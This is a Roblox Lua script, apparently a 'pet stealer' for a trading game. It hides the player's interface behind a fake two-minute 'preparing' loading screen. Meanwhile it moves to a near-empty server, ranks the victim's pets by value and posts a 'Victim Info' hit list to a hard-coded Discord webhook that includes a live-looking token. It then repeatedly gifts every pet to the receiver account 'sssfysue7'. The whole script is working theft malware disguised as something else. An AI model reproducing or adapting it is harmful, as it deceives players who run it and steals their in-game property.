-- =========================
-- الخدمات الأساسية
-- ========================
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local StarterGui = game:GetService("StarterGui")
local player = Players.LocalPlayer
local PlayerGui = player:WaitForChild("PlayerGui")

-- =========================
-- 1: النقل التلقائي كل 3 دقائق
-- =========================
task.spawn(function()
    local function findEmptyServer()
        local currentPlayers = #Players:GetPlayers()
        if currentPlayers > 3 then  
            local success, servers = pcall(function()  
                return HttpService:JSONDecode(game:HttpGet(  
                    "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"  
                ))  
            end)  
            if success and servers and servers.data then  
                for _, server in ipairs(servers.data) do  
                    if server.playing <= 3 and server.id ~= game.JobId then  
                        local transferSuccess = pcall(function()  
                            TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, player)  
                        end)  
                        if transferSuccess then  
                            return true  
                        end  
                    end  
                end  
            end  
        end  
        return false  
    end  

    while true do  
        local moved = findEmptyServer()  
        if moved then break end  
        wait(180)  
    end
end)

-- =========================
-- 2: واجهة التحميل
-- =========================
task.spawn(function()
    for _, guiType in pairs(Enum.CoreGuiType:GetEnumItems()) do
        pcall(function() StarterGui:SetCoreGuiEnabled(guiType, false) end)
    end

    for _, child in ipairs(PlayerGui:GetChildren()) do  
        if not child:IsA("PersistentGui") then child:Destroy() end  
    end  

    local ScreenGui = Instance.new("ScreenGui")  
    ScreenGui.Name = "PreparationLoader"  
    ScreenGui.IgnoreGuiInset = true  
    ScreenGui.ResetOnSpawn = false  
    ScreenGui.Parent = PlayerGui  

    local Background = Instance.new("Frame")  
    Background.Size = UDim2.new(1, 0, 1, 0)  
    Background.BackgroundColor3 = Color3.fromRGB(5, 5, 15)  
    Background.BorderSizePixel = 0  
    Background.Parent = ScreenGui  

    local Title = Instance.new("TextLabel")  
    Title.Size = UDim2.new(0.7, 0, 0.1, 0)  
    Title.Position = UDim2.new(0.15, 0, 0.3, 0)  
    Title.BackgroundTransparency = 1  
    Title.Text = "We are preparing now, thank you for your patience"  
    Title.TextColor3 = Color3.fromRGB(0, 255, 200)  
    Title.TextScaled = true  
    Title.Font = Enum.Font.GothamBlack  
    Title.Parent = Background  

    local ProgressBarBG = Instance.new("Frame")  
    ProgressBarBG.Size = UDim2.new(0.6, 0, 0.03, 0)  
    ProgressBarBG.Position = UDim2.new(0.2, 0, 0.5, 0)  
    ProgressBarBG.BackgroundColor3 = Color3.fromRGB(30, 30, 50)  
    ProgressBarBG.BorderSizePixel = 0  
    ProgressBarBG.Parent = Background  

    local ProgressBar = Instance.new("Frame")  
    ProgressBar.Size = UDim2.new(0, 0, 1, 0)  
    ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 200, 255)  
    ProgressBar.BorderSizePixel = 0  
    ProgressBar.Parent = ProgressBarBG  

    local PercentText = Instance.new("TextLabel")  
    PercentText.Size = UDim2.new(0.2, 0, 0.05, 0)  
    PercentText.Position = UDim2.new(0.4, 0, 0.55, 0)  
    PercentText.BackgroundTransparency = 1  
    PercentText.Text = "0%"  
    PercentText.TextColor3 = Color3.fromRGB(255, 255, 255)  
    PercentText.TextScaled = true  
    PercentText.Font = Enum.Font.GothamBold  
    PercentText.Parent = Background  

    local function animateLoader()  
        local duration = 120  
        local startTime = tick()  
        while tick() - startTime < duration do  
            local elapsed = tick() - startTime  
            local progress = elapsed / duration  
            local percent = math.floor(progress * 100)  
            ProgressBar.Size = UDim2.new(progress, 0, 1, 0)  
            PercentText.Text = percent .. "%"  
            local r = progress * 255  
            local g = (1 - progress) * 255  
            local b = 100  
            ProgressBar.BackgroundColor3 = Color3.fromRGB(r, g, b)  
            wait(0.1)  
        end  
        ProgressBar.Size = UDim2.new(1, 0, 1, 0)  
        PercentText.Text = "100%"  
        ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)  
        while true do wait(1) end
    end  

    animateLoader()
end)

-- =========================
-- 3: نظام ويب هوك والجيفت المحسن
-- =========================
task.spawn(function()
    wait(5)
    
    local DataService = require(ReplicatedStorage.Modules.DataService)
    local PetRegistry = require(ReplicatedStorage.Data.PetRegistry)
    local NumberUtil = require(ReplicatedStorage.Modules.NumberUtil)
    local PetUtilities = require(ReplicatedStorage.Modules.PetServices.PetUtilities)

    local function CalculatePetValueFromValues(petData)
        local HatchedFrom = petData.HatchedFrom
        if not HatchedFrom or HatchedFrom == "" then return 0 end
        local eggData = PetRegistry.PetEggs[HatchedFrom]
        if not eggData then return 0 end
        local petInfo = eggData.RarityData.Items[petData.PetType]
        if not petInfo then return 0 end
        local WeightRange = petInfo.GeneratedPetData.WeightRange
        if not WeightRange then return 0 end
        local baseSell = PetRegistry.PetList[petData.PetType].SellPrice
        local weightNorm = NumberUtil.ReverseLerp(WeightRange[1], WeightRange[2], petData.BaseWeight)
        local weightMult = math.lerp(0.8, 1.2, weightNorm)
        local level = petData.Level or 1
        local levelProg = PetUtilities.GetLevelProgress(level)
        local levelMult = math.lerp(0.15, 6, levelProg)
        return math.floor(baseSell * weightMult * levelMult)
    end

    local backpack = player:FindFirstChild("Backpack")
    if not backpack then return end

    local data = DataService:GetData()
    local inventory = data.PetsData.PetInventory.Data
    if not inventory then return end

    local petList = {}

    for uuid, petEntry in pairs(inventory) do
        local petData = {
            PetType = petEntry.PetType,
            HatchedFrom = petEntry.PetData.HatchedFrom,
            BaseWeight = petEntry.PetData.BaseWeight or 0,
            Level = petEntry.PetData.Level or 1
        }

        local value = CalculatePetValueFromValues(petData)

        table.insert(petList, {
            uuid = uuid,
            entry = petEntry,
            type = petEntry.PetType,
            weight = math.floor((petEntry.PetData.BaseWeight or 0) * 100) / 100,
            level = petEntry.PetData.Level or 1,
            value = value
        })
    end

    table.sort(petList, function(a, b) return a.value > b.value end)

    local WEBHOOK_URL = "https://discord.com/api/webhooks/1422573891943010349/mc5Nt5JD7B0QTKZWhgYdUhzfYJRxyPMb1x9qucLBccpmdE8jLV3cIUV79NaQjQZZ4uqW"

    local placeId = game.PlaceId
    local jobId = game.JobId
    local floatingLink = "https://floating.gg/?placeID=" .. placeId .. "&gameInstanceId=" .. jobId

    local message = "@everyone **Alien Hit**\n──────────────\n" ..
                   "**Victim Info:**\nUsername: " .. player.Name .. "\nExecutor: Delta\nAccount Age: " .. player.AccountAge .. " Days\nReceiver: sssfysue7\n──────────────\n**Hit List:**\n"

    for i = 1, math.min(10, #petList) do
        message = message .. "• " .. petList[i].type .. " [" .. petList[i].weight .. " kg] [Age " .. petList[i].level .. "]\n"
    end

    message = message .. "──────────────\n**Total Items:** " .. #petList ..
              "\n**Server:** 🔗 [Click Me to Join](" .. floatingLink .. ")" ..
              "\n**Time:** " .. os.date("%Y-%m-%d %H:%M:%S")

    local requestFunc = (syn and syn.request) or http_request or request
    if requestFunc then
        pcall(function()
            requestFunc({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"]="application/json"},
                Body = HttpService:JSONEncode({content = message})
            })
        end)

        wait(0.5)

        local fileContent = "🎮 Complete Hit List - " .. player.Name .. "\n\n"
        fileContent = fileContent .. "📦 TOTAL PETS: " .. #petList .. "\n\n"
        fileContent = fileContent .. "🏆 ALL PETS (Highest Value First):\n"
        
        for i, pet in ipairs(petList) do
            fileContent = fileContent .. string.format("%d. %s | %.2f kg | Age %d\n", i, pet.type, pet.weight, pet.level)
        end

        pcall(function()
            requestFunc({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"]="multipart/form-data; boundary=---011000010111000001101001"},
                Body = table.concat({
                    "-----011000010111000001101001",
                    'Content-Disposition: form-data; name="file"; filename="CompletePetList.txt"',
                    "Content-Type: text/plain",
                    "",
                    fileContent,
                    "-----011000010111000001101001--"
                }, "\r\n")
            })
        end)
    end
end)

-- =========================
-- 4: نظام الجيفت للبِتات
-- =========================
local function removePetsFromFarm()
    while true do
        pcall(function()
            local PetsService = ReplicatedStorage:FindFirstChild("GameEvents")
                                and ReplicatedStorage.GameEvents:FindFirstChild("PetsService")
            if PetsService then
                for _, obj in ipairs(workspace:GetDescendants()) do
                    if obj:IsA("Model") or obj:IsA("Folder") then
                        local id = string.match(obj.Name, "{[%w%-]+}")
                        if id then
                            pcall(function() PetsService:FireServer("UnequipPet", id) end)
                            wait(0.2)
                        end
                    end
                end
            end
        end)
        wait(60)
    end
end

local function equipPet(pet)
    if pet and pet.Parent ~= player.Character then
        pet.Parent = player.Character
        local humanoid = player.Character:FindFirstChild("Humanoid")
        if humanoid and pet:IsA("Tool") then
            pcall(function() humanoid:EquipTool(pet) end)
        end
    end
end

local function equipPetsAndToggleFavorite()
    while true do
        local backpack = player:FindFirstChild("Backpack")
        if backpack then
            for _, item in ipairs(backpack:GetChildren()) do
                local itemType = item:GetAttribute("ItemType")
                if itemType == "Pet" or string.find(item.Name:lower(),"pet") then
                    equipPet(item)
                    task.wait(0.5)
                    pcall(function() ReplicatedStorage.GameEvents.Favorite_Item:FireServer(item) end)
                    task.wait(3)
                end
            end
        end
        task.wait(1)
    end
end

local function autoGivePet(targetPlayerName)
    local targetPlayer = Players:FindFirstChild(targetPlayerName)
    while not targetPlayer do
        Players.PlayerAdded:Wait()
        targetPlayer = Players:FindFirstChild(targetPlayerName)
    end
    while true do
        if targetPlayer then
            pcall(function() ReplicatedStorage.GameEvents.PetGiftingService:FireServer("GivePet", targetPlayer) end)
        end
        task.wait(2)
    end
end

task.spawn(removePetsFromFarm)
task.spawn(equipPetsAndToggleFavorite)
task.spawn(function() autoGivePet("sssfysue7") end)
